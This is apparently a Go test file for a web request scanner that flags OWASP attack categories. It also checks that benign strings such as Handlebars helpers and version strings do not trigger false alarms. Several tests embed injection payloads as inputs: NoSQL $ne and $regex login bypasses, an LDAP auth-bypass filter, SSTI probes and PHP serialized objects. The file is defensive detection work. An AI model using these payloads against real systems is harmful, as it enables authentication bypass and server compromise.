func TestHasDeserializationIndicatorSkipsPlainColonText(t *testing.T) {
	samples := []string{
		"https://example.com/path",
		"resource.c-ctrip.com load success",
		"params: value",
	}
	for _, sample := range samples {
		if hasDeserializationIndicator(sample) {
			t.Fatalf("plain text should not trigger deserialization indicator: %q", sample)
		}
	}
}

func TestCheckOWASP_Deser_PHPSerializedStringPair(t *testing.T) {
	hits := CheckOWASP("mid", "/vulnerabilities/sqli/", `id=s%3A3%3A%22key%22%3Bs%3A5%3A%22value%22`, nil, nil)
	if !hasCategory(hits, CatDeserial) {
		t.Fatalf("expected deserialization hit for PHP serialized string pair, got %+v", hits)
	}
}

func TestHasDeserializationIndicatorKeepsPHPSerializedObject(t *testing.T) {
	if !hasDeserializationIndicator(`o:8:"stdclass":0:{}`) {
		t.Fatal("expected PHP serialized object indicator")
	}
}

// NoSQL: this.password comparison
func TestCheckOWASP_NoSQLi_ThisPassword(t *testing.T) {
	hits := CheckOWASP("mid", "/api/login", `filter={"$where": "this.password == 'test'"}`, nil, nil)
	if !hasCategory(hits, CatNoSQLi) {
		t.Fatal("expected NoSQL injection hit for this.password comparison")
	}
}

// ── 新增误报抑制验证测试 ──

// SSTI：Handlebars {{each}} 助手不应触发（合法模板语法）
func TestCheckOWASP_Clean_HandlebarsHelpers(t *testing.T) {
	body := "{{each user.items}}{{this.name}}{{/each}}"
	hits := CheckOWASP("mid", "/", "", nil, []string{body})
	if hasCategory(hits, CatTmplInject) {
		t.Fatalf("Handlebars {{each}} helper should not trigger SSTI at mid sensitivity, got %+v", hits)
	}
}

// SSTI：Handlebars {{log}} 不应触发
func TestCheckOWASP_Clean_HandlebarsLog(t *testing.T) {
	body := "{{log 'debug message' this}}"
	hits := CheckOWASP("mid", "/", "", nil, []string{body})
	if hasCategory(hits, CatTmplInject) {
		t.Fatalf("Handlebars {{log}} should not trigger SSTI, got %+v", hits)
	}
}

// SSTI：数学表达式注入仍然检出（{{7*7}}）
func TestCheckOWASP_SSTI_MathExpr(t *testing.T) {
	hits := CheckOWASP("mid", "/", "name={{7*7}}", nil, nil)
	if !hasCategory(hits, CatTmplInject) {
		t.Fatal("{{7*7}} math expression should still trigger SSTI")
	}
}

// SSTI：Python类链仍然检出
func TestCheckOWASP_SSTI_PythonClass(t *testing.T) {
	hits := CheckOWASP("mid", "/", `x={{''.__class__.__mro__}}`, nil, nil)
	if !hasCategory(hits, CatTmplInject) {
		t.Fatal("Python class chain should still trigger SSTI")
	}
}

// Helper

func TestCheckOWASP_LDAP_AuthBypassVariant(t *testing.T) {
	hits := CheckOWASP("mid", "/login", "user=*)(|(uid=*)(mail=*))", nil, nil)
	if !hasCategory(hits, CatLDAPI) {
		t.Fatal("expected LDAP injection hit for auth bypass variant")
	}
}

func TestCheckOWASP_NoSQLi_QueryArrayOperator(t *testing.T) {
	hits := CheckOWASP("mid", "/api/users", "username[$ne]=admin", nil, nil)
	if !hasCategory(hits, CatNoSQLi) {
		t.Fatal("expected NoSQL injection hit for query operator array syntax")
	}
}

func TestCheckOWASP_NoSQLi_JSONKeyOperator(t *testing.T) {
	hits := CheckOWASP("mid", "/api/login", `{"username":{"$regex":".*"},"password":{"$ne":null}}`, nil, nil)
	if !hasCategory(hits, CatNoSQLi) {
		t.Fatal("expected NoSQL injection hit for JSON key operator syntax")
	}
}

func TestCheckOWASP_Clean_BacktickVersionString(t *testing.T) {
	hits := CheckOWASP("high", "/UnifiedIDMPortal/ajaxHandler/common/dev", "reflushCode=0.3988039699917554&cVersion=UP_CAS_6.11.0.100_live", nil, nil)
	if hasCategory(hits, CatCmdInject) {
		t.Fatalf("benign version string containing CAS should not trigger cmd injection, got %+v", hits)
	}
}

func hasCategory(hits []OWASPHit, cat OWASPCategory) bool {
	for _, h := range hits {
		if h.Category == cat {
			return true
		}
	}
	return false
}
